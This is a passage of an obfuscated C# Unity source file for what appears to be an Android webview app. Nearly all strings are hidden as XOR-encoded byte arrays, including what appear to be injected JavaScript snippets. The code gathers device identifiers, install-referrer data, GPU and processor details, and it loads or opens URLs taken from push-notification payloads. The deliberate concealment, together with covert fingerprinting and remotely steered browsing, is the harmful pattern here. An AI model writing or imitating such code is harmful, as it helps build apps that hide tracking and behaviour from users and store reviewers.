49, 39, 47, 76, 79, 83, 74, 75, 43, 39, 107, 110, 108, 98, 39, 64, 98, 100, 108, 104, 46, 39, 68, 111, 117, 104, 106, 98, 40, 54, 53, 55, 41, 55, 41, 55, 41, 55, 39, 84, 102, 97, 102, 117, 110, 40, 50, 52, 48, 41, 52, 49, 32, 46, 60 }, 7) + _0x581f7fed._0x77e9fe38(new byte[30] { 230, 231, 228, 170, 242, 240, 237, 246, 237, 174, 165, 242, 238, 227, 246, 228, 237, 240, 239, 165, 174, 165, 213, 235, 236, 177, 176, 165, 171, 185 }, 130) + _0x581f7fed._0x77e9fe38(new byte[34] { 90, 91, 88, 22, 78, 76, 81, 74, 81, 18, 25, 72, 91, 80, 90, 81, 76, 25, 18, 25, 121, 81, 81, 89, 82, 91, 30, 119, 80, 93, 16, 25, 23, 5 }, 62) + _0x581f7fed._0x77e9fe38(new byte[30] { 151, 150, 149, 219, 131, 129, 156, 135, 156, 223, 212, 158, 146, 139, 167, 156, 134, 144, 155, 163, 156, 154, 157, 135, 128, 212, 223, 195, 218, 200 }, 243) + _0x581f7fed._0x77e9fe38(new byte[449] { 13, 11, 0, 2, 15, 24, 11, 89, 12, 24, 29, 68, 2, 27, 11, 24, 23, 29, 10, 67, 34, 2, 27, 11, 24, 23, 29, 67, 94, 58, 17, 11, 22, 20, 16, 12, 20, 94, 85, 15, 28, 11, 10, 16, 22, 23, 67, 94, 72, 75, 73, 94, 4, 85, 2, 27, 11, 24, 23, 29, 67, 94, 62, 22, 22, 30, 21, 28, 89, 58, 17, 11, 22, 20, 28, 94, 85, 15, 28, 11, 10, 16, 22, 23, 67, 94, 72, 75, 73, 94, 4, 85, 2, 27, 11, 24, 23, 29, 67, 94, 55, 22, 13, 68, 56, 70, 59, 11, 24, 23, 29, 94, 85, 15, 28, 11, 10, 16, 22, 23, 67, 94, 75, 77, 94, 4, 36, 85, 20, 22, 27, 16, 21, 28, 67, 31, 24, 21, 10, 28, 85, 9, 21, 24, 13, 31, 22, 11, 20, 67, 94, 46, 16, 23, 29, 22, 14, 10, 94, 85, 30, 28, 13, 49, 16, 30, 17, 60, 23, 13, 11, 22, 9, 0, 47, 24, 21, 12, 28, 10, 67, 31, 12, 23, 26, 13, 16, 22, 23, 81, 80, 2, 11, 28, 13, 12, 11, 23, 89, 41, 11, 22, 20, 16, 10, 28, 87, 11, 28, 10, 22, 21, 15, 28, 81, 2, 24, 11, 26, 17, 16, 13, 28, 26, 13, 12, 11, 28, 67, 94, 1, 65, 79, 94, 85, 27, 16, 13, 23, 28, 10, 10, 67, 94, 79, 77, 94, 85, 20, 22, 27, 16, 21, 28, 67, 31, 24, 21, 10, 28, 85, 20, 22, 29, 28, 21, 67, 94, 94, 85, 9, 21, 24, 13, 31, 22, 11, 20, 67, 94, 46, 16, 23, 29, 22, 14, 10, 94, 85, 9, 21, 24, 13, 31, 22, 11, 20, 47, 28, 11, 10, 16, 22, 23, 67, 94, 72, 76, 87, 73, 87, 73, 94, 85, 12, 24, 63, 12, 21, 21, 47, 28, 11, 10, 16, 22, 23, 67, 94, 72, 75, 73, 87, 73, 87, 73, 87, 73, 94, 4, 80, 66, 4, 4, 66, 54, 27, 19, 28, 26, 13, 87, 29, 28, 31, 16, 23, 28, 41, 11, 22, 9, 28, 11, 13, 0, 81, 9, 11, 22, 13, 22, 85, 94, 12, 10, 28, 11, 56, 30, 28, 23, 13, 61, 24, 13, 24, 94, 85, 2, 30, 28, 13, 67, 31, 12, 23, 26, 13, 16, 22, 23, 81, 80, 2, 11, 28, 13, 12, 11, 23, 89, 12, 24, 29, 66, 4, 85, 26, 22, 23, 31, 16, 30, 12, 11, 24, 27, 21, 28, 67, 13, 11, 12, 28, 4, 80, 66, 4, 26, 24, 13, 26, 17, 81, 28, 80, 2, 4 }, 121) + _0x581f7fed._0x77e9fe38(new byte[112] { 163, 162, 161, 239, 180, 164, 181, 162, 162, 169, 235, 224, 176, 174, 163, 179, 175, 224, 235, 246, 254, 245, 247, 238, 252, 163, 162, 161, 239, 180, 164, 181, 162, 162, 169, 235, 224, 175, 162, 174, 160, 175, 179, 224, 235, 246, 247, 255, 247, 238, 252, 163, 162, 161, 239, 180, 164, 181, 162, 162, 169, 235, 224, 166, 177, 166, 174, 171, 144, 174, 163, 179, 175, 224, 235, 246, 254, 245, 247, 238, 252, 163, 162, 161, 239, 180, 164, 181, 162, 162, 169, 235, 224, 166, 177, 166, 174, 171, 143, 162, 174, 160, 175, 179, 224, 235, 246, 247, 243, 247, 238, 252 }, 199) + _0x581f7fed._0x77e9fe38(new byte[45] { 27, 29, 22, 20, 24, 6, 1, 11, 0, 24, 65, 0, 1, 27, 0, 26, 12, 7, 28, 27, 14, 29, 27, 82, 26, 1, 11, 10, 9, 6, 1, 10, 11, 84, 18, 12, 14, 27, 12, 7, 71, 10, 70, 20, 18 }, 111) + _0x581f7fed._0x77e9fe38(new byte[721] { 157, 155, 144, 146, 159, 136, 155, 201, 134, 155, 128, 142, 212, 158, 128, 135, 141, 134, 158, 199, 132, 136, 157, 138, 129, 164, 140, 141, 128, 136, 199, 139, 128, 135, 141, 193, 158, 128, 135, 141, 134, 158, 192, 210, 158, 128, 135, 141, 134, 158, 199, 132, 136, 157, 138, 129, 164, 140, 141, 128, 136, 212, 143, 156, 135, 138, 157, 128, 134, 135, 193, 152, 192, 146, 159, 136, 155, 201, 154, 212, 186, 157, 155, 128, 135, 142, 193, 152, 192, 199, 157, 134, 165, 134, 158, 140, 155, 170, 136, 154, 140, 193, 192, 210, 128, 143, 193, 154, 199, 128, 135, 141, 140, 145, 166, 143, 193, 206, 153, 134, 128, 135, 157, 140, 155, 211, 201, 138, 134, 136, 155, 154, 140, 206, 192, 215, 212, 217, 149, 149, 154, 199, 128, 135, 141, 140, 145, 166, 143, 193, 206, 129, 134, 159, 140, 155, 211, 201, 135, 134, 135, 140, 206, 192, 215, 212, 217, 149, 149, 154, 199, 128, 135, 141, 140, 145, 166, 143, 193, 206, 132, 136, 145, 196, 158, 128, 141, 157, 129, 206, 192, 215, 212, 217, 149, 149, 154, 199, 128, 135, 141, 140, 145, 166, 143, 193, 206, 132, 136, 145, 196, 141, 140, 159, 128, 138, 140, 196, 158, 128, 141, 157, 129, 206, 192, 215, 212, 217, 192, 155, 140, 157, 156, 155, 135, 201, 146, 132, 136, 157, 138, 129, 140, 154, 211, 143, 136, 133, 154, 140, 197, 132, 140, 141, 128, 136, 211, 152, 197, 134, 135, 138, 129, 136, 135, 142, 140, 211, 135, 156, 133, 133, 197, 136, 141, 141, 165, 128, 154, 157, 140, 135, 140, 155, 211, 143, 156, 135, 138, 157, 128, 134, 135, 193, 192, 146, 148, 197, 155, 140, 132, 134, 159, 140, 165, 128, 154, 157, 140, 135, 140, 155, 211, 143, 156, 135, 138, 157, 128, 134, 135, 193, 192, 146, 148, 197, 136, 141, 141, 172, 159, 140, 135, 157, 165, 128, 154, 157, 140, 135, 140, 155, 211, 143, 156, 135, 138, 157, 128, 134, 135, 193, 192, 146, 148, 197, 155, 140, 132, 134, 159, 140, 172, 159, 140, 135, 157, 165, 128, 154, 157, 140, 135, 140, 155, 211, 143, 156, 135, 138, 157, 128, 134, 135, 193, 192, 146, 148, 197, 141, 128, 154, 153, 136, 157, 138, 129, 172, 159, 140, 135, 157, 211, 143, 156, 135, 138, 157, 128, 134, 135, 193, 192, 146, 155, 140, 157, 156, 155, 135, 201, 143, 136, 133, 154, 140, 210, 148, 148, 210, 128, 143, 193, 154, 199, 128, 135, 141, 140, 145, 166, 143, 193, 206, 153, 134, 128, 135, 157, 140, 155, 211, 201, 143, 128, 135, 140, 206, 192, 215, 212, 217, 149, 149, 154, 199, 128, 135, 141, 140, 145, 166, 143, 193, 206, 129, 134, 159, 140, 155, 211, 201, 129, 134, 159, 140, 155, 206, 192, 215, 212, 217, 192, 155, 140, 157, 156, 155, 135, 201, 146, 132, 136, 157, 138, 129, 140, 154, 211, 157, 155, 156, 140, 197, 132, 140, 141, 128, 136, 211, 152, 197, 134, 135, 138, 129, 136, 135, 142, 140, 211, 135, 156, 133, 133, 197, 136, 141, 141, 165, 128, 154, 157, 140, 135, 140, 155, 211, 143, 156, 135, 138, 157, 128, 134, 135, 193, 192, 146, 148, 197, 155, 140, 132, 134, 159, 140, 165, 128, 154, 157, 140, 135, 140, 155, 211, 143, 156, 135, 138, 157, 128, 134, 135, 193, 192, 146, 148, 197, 136, 141, 141, 172, 159, 140, 135, 157, 165, 128, 154, 157, 140, 135, 140, 155, 211, 143, 156, 135, 138, 157, 128, 134, 135, 193, 192, 146, 148, 197, 155, 140, 132, 134, 159, 140, 172, 159, 140, 135, 157, 165, 128, 154, 157, 140, 135, 140, 155, 211, 143, 156, 135, 138, 157, 128, 134, 135, 193, 192, 146, 148, 197, 141, 128, 154, 153, 136, 157, 138, 129, 172, 159, 140, 135, 157, 211, 143, 156, 135, 138, 157, 128, 134, 135, 193, 192, 146, 155, 140, 157, 156, 155, 135, 201, 143, 136, 133, 154, 140, 210, 148, 148, 210, 155, 140, 157, 156, 155, 135, 201, 134, 155, 128, 142, 193, 152, 192, 210, 148, 210, 148, 138, 136, 157, 138, 129, 193, 140, 192, 146, 148 }, 233) + _0x581f7fed._0x77e9fe38(new byte[5] { 124, 40, 41, 40, 58 }, 1);
    }

    private string _0x37108a1c()
    {
        try
        {
            using (var _0x7b5e2bc3 = new AndroidJavaClass(_0x581f7fed._0x77e9fe38(new byte[30] { 145, 157, 159, 220, 135, 156, 155, 134, 139, 193, 150, 220, 130, 158, 147, 139, 151, 128, 220, 167, 156, 155, 134, 139, 162, 158, 147, 139, 151, 128 }, 242)))
            {
                var _0x40abcc09 = _0x7b5e2bc3.GetStatic<AndroidJavaObject>(_0x581f7fed._0x77e9fe38(new byte[15] { 170, 188, 187, 187, 172, 167, 189, 136, 170, 189, 160, 191, 160, 189, 176 }, 201));
                var _0x009cbcfe = _0x40abcc09.Call<AndroidJavaObject>(_0x581f7fed._0x77e9fe38(new byte[21] { 79, 77, 92, 105, 88, 88, 68, 65, 75, 73, 92, 65, 71, 70, 107, 71, 70, 92, 77, 80, 92 }, 40));
                using (var _0xe1a9804e = new AndroidJavaClass(_0x581f7fed._0x77e9fe38(new byte[26] { 244, 251, 241, 231, 250, 252, 241, 187, 226, 240, 247, 254, 252, 225, 187, 194, 240, 247, 198, 240, 225, 225, 252, 251, 242, 230 }, 149)))
                {
                    return _0xe1a9804e.CallStatic<string>(_0x581f7fed._0x77e9fe38(new byte[19] { 115, 113, 96, 80, 113, 114, 117, 97, 120, 96, 65, 103, 113, 102, 85, 115, 113, 122, 96 }, 20), _0x009cbcfe);
                }
            }
        }
        catch
        {
            return "";
        }
    }

    public void _0xa47995de()
    {
        isDestroyedForce = true;
        StopAllCoroutines();
        {
#if B_LOGS
            Debug.Log(_0x581f7fed._0x77e9fe38(new byte[18] { 169, 166, 151, 129, 134, 175, 210, 190, 147, 135, 156, 145, 154, 210, 181, 147, 159, 151 }, 242));
#endif
        }

        _0x730e833b.Instance?._0x55b3c7da();
        _0x55a2f1f5.Instance._0x57940487(_0x5a07cf90._0xdc34cdfc.DEFAULT);
    }

    private void OnApplicationPause(bool _0x62053658)
    {
        isApplicationPause = _0x62053658;
    }

    private readonly List<UniWebViewPopup> _0x1c5e0b7d = new List<UniWebViewPopup>();
    private string _0x46f7efa9 = "";
    private void _0x10a20ee9()
    {
        using (var _0xba88021e = new AndroidJavaClass(_0x581f7fed._0x77e9fe38(new byte[30] { 18, 30, 28, 95, 4, 31, 24, 5, 8, 66, 21, 95, 1, 29, 16, 8, 20, 3, 95, 36, 31, 24, 5, 8, 33, 29, 16, 8, 20, 3 }, 113)))
        using (var _0x56bee5a5 = _0xba88021e.GetStatic<AndroidJavaObject>(_0x581f7fed._0x77e9fe38(new byte[15] { 111, 121, 126, 126, 105, 98, 120, 77, 111, 120, 101, 122, 101, 120, 117 }, 12)))
        using (var _0x42bded5b = _0x56bee5a5.Call<AndroidJavaObject>(_0x581f7fed._0x77e9fe38(new byte[9] { 40, 42, 59, 6, 33, 59, 42, 33, 59 }, 79)))
        {
            if (_0x42bded5b == null)
                return;
            using (var _0x935df546 = _0x42bded5b.Call<AndroidJavaObject>(_0x581f7fed._0x77e9fe38(new byte[9] { 132, 134, 151, 166, 155, 151, 145, 130, 144 }, 227)))
            {
                if (_0x935df546 == null)
                    return;
                using (var _0x352c692b = new AndroidJavaObject(_0x581f7fed._0x77e9fe38(new byte[19] { 25, 4, 17, 88, 28, 5, 25, 24, 88, 60, 37, 57, 56, 57, 20, 28, 19, 21, 2 }, 118)))
                using (var _0x0b6f3d76 = _0x935df546.Call<AndroidJavaObject>(_0x581f7fed._0x77e9fe38(new byte[6] { 12, 2, 30, 52, 2, 19 }, 103)))
                using (var _0xff78b957 = _0x0b6f3d76.Call<AndroidJavaObject>(_0x581f7fed._0x77e9fe38(new byte[8] { 201, 212, 197, 210, 193, 212, 207, 210 }, 160)))
                {
                    while (_0xff78b957.Call<bool>(_0x581f7fed._0x77e9fe38(new byte[7] { 164, 173, 191, 130, 169, 180, 184 }, 204)))
                    {
                        string _0xd7977c79 = _0xff78b957.Call<string>(_0x581f7fed._0x77e9fe38(new byte[4] { 101, 110, 115, 127 }, 11));
                        using (var _0xcf42c885 = _0x935df546.Call<AndroidJavaObject>(_0x581f7fed._0x77e9fe38(new byte[3] { 44, 46, 63 }, 75), _0xd7977c79))
                        {
                            _0x352c692b.Call<AndroidJavaObject>(_0x581f7fed._0x77e9fe38(new byte[3] { 107, 110, 111 }, 27), _0xd7977c79, _0xcf42c885);
                        }
                    }

                    string _0x9a8c1015 = _0x352c692b.Call<string>(_0x581f7fed._0x77e9fe38(new byte[8] { 209, 202, 246, 209, 215, 204, 203, 194 }, 165));
                    if (!string.IsNullOrEmpty(_0x9a8c1015))
                    {
                        _0x8c8e284c(_0x9a8c1015);
                        _0xd8be0b9e(_0x9a8c1015);
                    }
                }
            }
        }
    }

    internal Vector2 lastSize = Vector2.zero;
    private void _0x9e87bd34()
    {
        if (_0x3c978867)
        {
            WLog(_0x581f7fed._0x77e9fe38(new byte[18] { 45, 16, 1, 28, 72, 9, 4, 26, 13, 9, 12, 17, 72, 27, 0, 7, 31, 6 }, 104));
            return;
        }

        _0x2c009d27(false);
        WLog(_0x581f7fed._0x77e9fe38(new byte[46] { 19, 63, 55, 48, 126, 9, 59, 60, 8, 55, 59, 41, 126, 14, 43, 45, 54, 126, 16, 49, 42, 55, 56, 55, 61, 63, 42, 55, 49, 48, 126, 118, 54, 63, 44, 58, 41, 63, 44, 59, 126, 60, 63, 61, 53, 119 }, 94));
        ++_0x7abbeb00;
        _0xf8596e9f();
        if (_0x7abbeb00 <= 1)
            return;
        if (_0x9a137d73())
        {
            WLog(_0x581f7fed._0x77e9fe38(new byte[37] { 224, 221, 204, 209, 133, 214, 206, 204, 213, 213, 192, 193, 133, 136, 155, 133, 213, 202, 213, 208, 213, 214, 133, 214, 209, 204, 201, 201, 133, 202, 213, 192, 203, 192, 193, 159, 133 }, 165) + _0x1c5e0b7d.Count);
            return;
        }

        Application.Quit();
    }

    private void StopCurrentFailedLoad(UniWebView _0xb1c4b903)
    {
        _0x2c009d27(false);
        if (_0xb1c4b903 == null)
            return;
        _0xb1c4b903.Stop();
        if (_0xb1c4b903.CanGoBack)
            _0xb1c4b903.GoBack();
    }

    private IEnumerator _0x617066af(IEnumerator _0x21668645, TaskCompletionSource<bool> _0x6b7c29e9)
    {
        yield return _0x21668645;
        _0x6b7c29e9.SetResult(true);
    }

    private bool _0xee95cc91 = false;
    internal bool IsHttpUrl(string _0x15f3167e)
    {
        if (string.IsNullOrEmpty(_0x15f3167e))
            return false;
        return _0x15f3167e.StartsWith(_0x581f7fed._0x77e9fe38(new byte[7] { 59, 39, 39, 35, 105, 124, 124 }, 83), StringComparison.OrdinalIgnoreCase) || _0x15f3167e.StartsWith(_0x581f7fed._0x77e9fe38(new byte[8] { 41, 53, 53, 49, 50, 123, 110, 110 }, 65), StringComparison.OrdinalIgnoreCase);
    }

    internal bool _0x30879500(string _0x7dbafb7e)
    {
        return _0x7dbafb7e.StartsWith(_0x581f7fed._0x77e9fe38(new byte[9] { 60, 48, 35, 58, 52, 37, 107, 126, 126 }, 81), StringComparison.OrdinalIgnoreCase) || _0x7dbafb7e.StartsWith(_0x581f7fed._0x77e9fe38(new byte[24] { 62, 34, 34, 38, 37, 108, 121, 121, 38, 58, 55, 47, 120, 49, 57, 57, 49, 58, 51, 120, 53, 57, 59, 121 }, 86), StringComparison.OrdinalIgnoreCase) || _0x7dbafb7e.StartsWith(_0x581f7fed._0x77e9fe38(new byte[23] { 112, 108, 108, 104, 34, 55, 55, 104, 116, 121, 97, 54, 127, 119, 119, 127, 116, 125, 54, 123, 119, 117, 55 }, 24), StringComparison.OrdinalIgnoreCase);
    }

    private void _0x8c8e284c(string _0xb6a6f663)
    {
        Dictionary<string, object> _0x684b4e72;
        try
        {
            _0x684b4e72 = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0xb6a6f663);
        }
        catch
        {
            return;
        }

        var _0x6b128e1c = ReadPushField(_0x684b4e72, _0x581f7fed._0x77e9fe38(new byte[3] { 1, 6, 24 }, 116));
        if (string.IsNullOrWhiteSpace(_0x6b128e1c))
            return;
        _0x6b128e1c = _0x6b128e1c.Trim();
        if (!IsHttpUrl(_0x6b128e1c))
            return;
        if (string.Equals(_0x6b128e1c, _0x5ecc042f, StringComparison.Ordinal))
            return;
        _0x5ecc042f = _0x6b128e1c;
        OpenUrlExternally(_0x6b128e1c);
    }

    internal bool IsAboutBlank(string _0x50879b90)
    {
        if (string.IsNullOrEmpty(_0x50879b90))
            return false;
        return _0x50879b90.StartsWith(_0x581f7fed._0x77e9fe38(new byte[11] { 196, 199, 202, 208, 209, 159, 199, 201, 196, 203, 206 }, 165), StringComparison.OrdinalIgnoreCase);
    }

    private string GetFailingUrl(UniWebViewNativeResultPayload _0xdab83c4c)
    {
        if (_0xdab83c4c == null || _0xdab83c4c.Extra == null)
            return null;
        object _0x6f037b7d;
        if (!_0xdab83c4c.Extra.TryGetValue(UniWebViewNativeResultPayload.ExtraFailingURLKey, out _0x6f037b7d))
            return null;
        return _0x6f037b7d as string;
    }

    private string _0xe9832efe()
    {
        float _0xad0ad616 = Time.realtimeSinceStartup;
        if (_0xad0ad616 < 0f)
            _0xad0ad616 = 0f;
        int _0x1ac5b5a2 = (int)(_0xad0ad616 * 1000f);
        int _0xdd08d514 = _0x1ac5b5a2 / 60000;
        int _0x5478c51a = (_0x1ac5b5a2 / 1000) % 60;
        int _0x08108e35 = _0x1ac5b5a2 % 1000;
        return string.Format(_0x581f7fed._0x77e9fe38(new byte[21] { 110, 37, 47, 37, 37, 104, 47, 110, 36, 47, 37, 37, 104, 47, 110, 39, 47, 37, 37, 37, 104 }, 21), _0xdd08d514, _0x5478c51a, _0x08108e35);
    }

    private void _0x2c009d27(bool _0x2f7cecb4)
    {
        _0x635c034f();
        _0x7bf23493.SetActive(_0x2f7cecb4);
        _0xdce2dcf4 = _0x2f7cecb4;
        if (_0x2f7cecb4)
        {
            _0x7bf23493.transform.SetAsLastSibling();
            if (_0xa91c9a08 != null)
                _0xa91c9a08.localRotation = Quaternion.identity;
        }
    }

    private void _0x7929b18d(string _0x74a05210)
    {
        if (string.IsNullOrEmpty(_0x74a05210))
            return;
        if (TryOpenExternalLikeChrome(_0x74a05210))
            return;
        OpenUrlExternally(_0x74a05210);
    }

    private bool TryOpenExternalLikeChrome(string _0x8c9d18da)
    {
        if (string.IsNullOrEmpty(_0x8c9d18da))
            return false;
        if (_0x8c9d18da.StartsWith(_0x581f7fed._0x77e9fe38(new byte[9] { 119, 112, 106, 123, 112, 106, 36, 49, 49 }, 30), StringComparison.OrdinalIgnoreCase))
            return _0x5cb47f8a(_0x8c9d18da);
        if (_0x30879500(_0x8c9d18da))
            return _0xf39b9cfc(_0x8c9d18da, null);
        if (!_0x8c9d18da.StartsWith(_0x581f7fed._0x77e9fe38(new byte[7] { 148, 136, 136, 140, 198, 211, 211 }, 252), StringComparison.OrdinalIgnoreCase) && !_0x8c9d18da.StartsWith(_0x581f7fed._0x77e9fe38(new byte[8] { 144, 140, 140, 136, 139, 194, 215, 215 }, 248), StringComparison.OrdinalIgnoreCase) && !_0x8c9d18da.StartsWith(_0x581f7fed._0x77e9fe38(new byte[11] { 26, 25, 20, 14, 15, 65, 25, 23, 26, 21, 16 }, 123), StringComparison.OrdinalIgnoreCase))
        {
            return _0xb65ff173(_0x8c9d18da);
        }

        return false;
    }

    private IEnumerator _0xc5fdaf69(Dictionary<string, object> _0xe914f9f1)
    {
        {
            {
#if B_LOGS
                Debug.Log(_0x581f7fed._0x77e9fe38(new byte[30] { 208, 223, 238, 248, 255, 214, 171, 205, 238, 255, 232, 227, 171, 206, 243, 255, 249, 234, 171, 219, 254, 248, 227, 171, 207, 234, 255, 234, 177, 171 }, 139) + string.Join(_0x581f7fed._0x77e9fe38(new byte[1] { 255 }, 246), _0xe914f9f1));
#endif
            }
        }

        string _0x5ed5f6ee = "";
        // Primary source: nested JSON under "notificationData"
        if (_0xe914f9f1 != null && _0xe914f9f1.TryGetValue(_0x581f7fed._0x77e9fe38(new byte[16] { 204, 205, 214, 203, 196, 203, 193, 195, 214, 203, 205, 204, 230, 195, 214, 195 }, 162), out var raw))
        {
            try
            {
                var _0xfe14cbce = raw?.ToString();
                var _0x87a465e6 = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0xfe14cbce);
                if (_0x87a465e6 != null && _0x87a465e6.TryGetValue(_0x581f7fed._0x77e9fe38(new byte[6] { 2, 20, 31, 21, 24, 21 }, 113), out var val))
                {
                    _0x5ed5f6ee = val?.ToString();
                }
            }
            catch (Exception e)
            {
#if B_LOGS
                Debug.LogError(_0x581f7fed._0x77e9fe38(new byte[30] { 2, 13, 60, 42, 45, 121, 9, 44, 42, 49, 4, 121, 19, 10, 22, 23, 121, 41, 56, 43, 42, 60, 121, 60, 43, 43, 54, 43, 99, 121 }, 89) + e);
#endif
            }
        }

        // Fallback: flat structure
        if (string.IsNullOrEmpty(_0x5ed5f6ee) && _0xe914f9f1 != null && _0xe914f9f1.TryGetValue(_0x581f7fed._0x77e9fe38(new byte[6] { 26, 12, 7, 13, 0, 13 }, 105), out var lab))
        {
            _0x5ed5f6ee = lab?.ToString();
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x581f7fed._0x77e9fe38(new byte[38] { 201, 198, 247, 225, 230, 178, 194, 231, 225, 250, 207, 178, 212, 247, 230, 241, 250, 247, 246, 178, 225, 247, 252, 246, 251, 246, 178, 244, 224, 253, 255, 178, 248, 225, 253, 252, 168, 178 }, 146) + _0x5ed5f6ee);
            }
#endif
        }

        if (string.IsNullOrEmpty(_0x5ed5f6ee))
            yield break;
        {
#if B_LOGS
            {
                Debug.Log(_0x581f7fed._0x77e9fe38(new byte[38] { 137, 134, 183, 161, 166, 242, 130, 167, 161, 186, 143, 242, 133, 179, 187, 166, 242, 166, 189, 242, 189, 162, 183, 188, 242, 165, 187, 166, 186, 242, 161, 183, 188, 182, 187, 182, 232, 242 }, 210) + _0x5ed5f6ee);
            }
#endif
        }

        _0xdbbbc131 = _0x5ed5f6ee;
        yield return new WaitUntil(() => _0xae32ae48);
        var _0x5a814f89 = _0xe7ce4d31(2, 100);
        yield return new WaitUntil(() => _0x5a814f89.IsCompleted);
        string _0x11126d9f = _0x5a814f89.Result;
        if (!string.IsNullOrEmpty(_0x11126d9f))
        {
            string _0x2c868c6b = _0x5371514d(_0x11126d9f, _0x5ed5f6ee);
            {
#if B_LOGS
                Debug.Log(_0x581f7fed._0x77e9fe38(new byte[33] { 237, 226, 211, 197, 194, 150, 230, 195, 197, 222, 235, 150, 228, 211, 218, 217, 215, 210, 150, 225, 211, 212, 224, 223, 211, 193, 150, 193, 223, 194, 222, 140, 150 }, 182) + _0x2c868c6b);
#endif
            }

            _0xa3c94682.Load(_0x2c868c6b);
        }
    }

    internal bool isApplicationPause = false;
    // WS_SOURCE MONO
    public static _0x614c50eb _0x1021fa71 { get; private set; }

    private bool _0xbf1779c9 = false;
    public void _0x9744c589()
    {
        if (_0xae32ae48)
            return;
        {
#if B_LOGS
            {
                Debug.Log(_0x581f7fed._0x77e9fe38(new byte[33] { 39, 40, 25, 15, 8, 33, 92, 40, 21, 17, 25, 14, 92, 19, 9, 8, 92, 81, 66, 92, 17, 19, 10, 25, 92, 8, 19, 92, 15, 31, 25, 18, 25 }, 124));
            }
#endif
        }

        _0xa47995de();
    }

    internal bool isDestroyedForce = false;
    private string _0x2fc2626c { get; set; }

    private string _0x23445773 = "";
    private void OnApplicationFocus(bool _0xe21517c8)
    {
        isApplicationFocus = _0xe21517c8;
        if (_0xe21517c8 && _0xae32ae48)
        {
            _0x10a20ee9();
        }
    }

    private IEnumerator _0xd12347d4()
    {
        yield return _0xf8374030(Permission.Camera);
    }

    private Action _0x52840b0f;
    private void _0x69898553()
    {
        {
#if B_LOGS
            Debug.Log(_0x581f7fed._0x77e9fe38(new byte[22] { 78, 65, 112, 102, 97, 72, 53, 70, 97, 122, 103, 112, 81, 112, 99, 124, 118, 112, 92, 123, 115, 122 }, 21));
#endif
        }

        _0xcd4c20b4 = SystemInfo.deviceModel;
        _0x06d4621c = Application.version;
        _0xfae224ea = Application.installMode;
        _0xa36d68f7 = Application.installerName;
        _0x24d000f7 = Application.identifier;
        _0x46f7efa9 = _0x6d528459();
        _0xba569bba = _0x37108a1c();
        _0xe33cc25c = SystemInfo.deviceUniqueIdentifier;
        _0xf27eddbe = SystemInfo.graphicsDeviceName;
        _0x18a598fc = SystemInfo.processorType;
        {
#if B_LOGS
            {
                _0x06d4621c = _0x581f7fed._0x77e9fe38(new byte[5] { 59, 34, 59, 34, 59 }, 12);
                _0xfae224ea = ApplicationInstallMode.Store;
                _0xa36d68f7 = _0x581f7fed._0x77e9fe38(new byte[19] { 100, 104, 106, 41, 102, 105, 99, 117, 104, 110, 99, 41, 113, 98, 105, 99, 110, 105, 96 }, 7);
                _0xba569bba = _0x581f7fed._0x77e9fe38(new byte[8] { 0, 8, 21, 17, 28, 69, 16, 4 }, 101);
                _0xe33cc25c = Guid.NewGuid().ToString().Replace(_0x581f7fed._0x77e9fe38(new byte[1] { 152 }, 181), "");
            }
#endif
        }

        {
#if B_LOGS
            Debug.Log(_0x581f7fed._0x77e9fe38(new byte[17] { 111, 96, 81, 71, 64, 105, 20, 80, 81, 66, 121, 91, 80, 81, 88, 14, 20 }, 52) + _0xcd4c20b4);
            Debug.Log(_0x581f7fed._0x77e9fe38(new byte[19] { 242, 253, 204, 218, 221, 244, 137, 200, 217, 217, 255, 204, 219, 218, 192, 198, 199, 147, 137 }, 169) + _0x06d4621c);
            Debug.Log(_0x581f7fed._0x77e9fe38(new byte[20] { 4, 11, 58, 44, 43, 2, 127, 54, 49, 44, 43, 62, 51, 51, 18, 48, 59, 58, 101, 127 }, 95) + _0xfae224ea);
            Debug.Log(_0x581f7fed._0x77e9fe38(new byte[23] { 120, 119, 70, 80, 87, 126, 3, 74, 77, 80, 87, 66, 79, 79, 70, 81, 112, 87, 76, 81, 70, 25, 3 }, 35) + _0xa36d68f7);
            Debug.Log(_0x581f7fed._0x77e9fe38(new byte[14] { 92, 83, 98, 116, 115, 90, 39, 102, 119, 119, 78, 99, 61, 39 }, 7) + _0x24d000f7);
            Debug.Log(_0x581f7fed._0x77e9fe38(new byte[14] { 215, 216, 233, 255, 248, 209, 172, 237, 232, 250, 197, 232, 182, 172 }, 140) + _0x46f7efa9);
            Debug.Log(_0x581f7fed._0x77e9fe38(new byte[18] { 1, 14, 63, 41, 46, 7, 122, 47, 41, 63, 40, 27, 61, 63, 52, 46, 96, 122 }, 90) + _0xba569bba);
            Debug.Log(_0x581f7fed._0x77e9fe38(new byte[17] { 196, 203, 250, 236, 235, 194, 191, 236, 230, 236, 219, 250, 233, 214, 251, 165, 191 }, 159) + _0xe33cc25c);
            Debug.Log(_0x581f7fed._0x77e9fe38(new byte[12] { 210, 221, 236, 250, 253, 212, 169, 238, 249, 252, 179, 169 }, 137) + _0xf27eddbe);
            Debug.Log(_0x581f7fed._0x77e9fe38(new byte[12] { 141, 130, 179, 165, 162, 139, 246, 181, 166, 163, 236, 246 }, 214) + _0x18a598fc);
#endif
        }
    }

    internal bool IsGoogleAuthFlowUrl(string _0xdcaaf1c1)
    {
        if (string.IsNullOrEmpty(_0xdcaaf1c1))
            return false;
        return _0xdcaaf1c1.IndexOf(_0x581f7fed._0x77e9fe38(new byte[19] { 33, 35, 35, 47, 53, 46, 52, 51, 110, 39, 47, 47, 39, 44, 37, 110, 35, 47, 45 }, 64), StringComparison.OrdinalIgnoreCase) >= 0 || _0xdcaaf1c1.IndexOf(_0x581f7fed._0x77e9fe38(new byte[16] { 154, 152, 152, 148, 142, 149, 143, 136, 213, 156, 148, 148, 156, 151, 158, 213 }, 251), StringComparison.OrdinalIgnoreCase) >= 0 || _0xdcaaf1c1.IndexOf(_0x581f7fed._0x77e9fe38(new byte[21] { 24, 16, 16, 24, 19, 26, 10, 12, 26, 13, 28, 16, 17, 11, 26, 17, 11, 81, 28, 16, 18 }, 127), StringComparison.OrdinalIgnoreCase) >= 0 || _0xdcaaf1c1.IndexOf(_0x581f7fed._0x77e9fe38(new byte[11] { 172, 184, 191, 170, 191, 162, 168, 229, 168, 164, 166 }, 203), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    //    private async Task<string> GetMyip()
    //    {
    //        string result = "";
    //        var processorType = SystemInfo.processorType;
    //        //        {
    //        //#if NOT_B_STARTED
    //        //#endif
